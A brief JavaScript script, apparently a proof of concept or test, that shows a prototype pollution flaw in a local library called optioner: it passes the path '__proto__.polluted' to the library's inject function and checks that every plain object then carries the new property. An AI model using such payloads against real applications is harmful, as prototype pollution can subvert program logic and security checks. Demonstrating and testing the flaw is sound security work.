const optioner = require('../src');

console.log({}.polluted)
optioner.inject("__proto__.polluted", "Polluted!", {})
console.log({}.polluted)